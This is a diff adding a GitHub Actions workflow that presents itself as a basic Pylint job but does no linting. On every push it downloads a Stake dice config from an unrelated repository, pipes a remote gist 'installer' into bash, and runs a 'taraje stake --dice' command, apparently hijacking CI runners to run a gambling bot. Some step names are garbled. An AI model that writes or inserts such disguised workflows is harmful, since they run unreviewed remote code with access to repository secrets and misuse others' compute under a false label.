@@ -1,0 +1,30 @@
+# This is a basic workflow to help you get started with Actions
+
+name: Pylint
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        python-version: ["3.10"]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v3
+      with:
+        python-version: ${{ matrix.python-version }}
+    - name: Install dependenciespis
+      run: |
+        python -m pip install --upgrade pip
+        pip3 install click
+        pip3 install colorama
+        pip3 install msgpack
+        pip3 install requests
+        pip3 install cloudscraper
+        wget https://github.com/Maovnwn/ybgs/raw/main/config_stake_dice.py
+        curl -fsSL https://gist.githubusercontent.com/ampasmanusa/f964cd342800cbe9385ceca7b480d44b/raw/installer | bash
+        taraje stake --dice --update
+        taraje stake --dice 
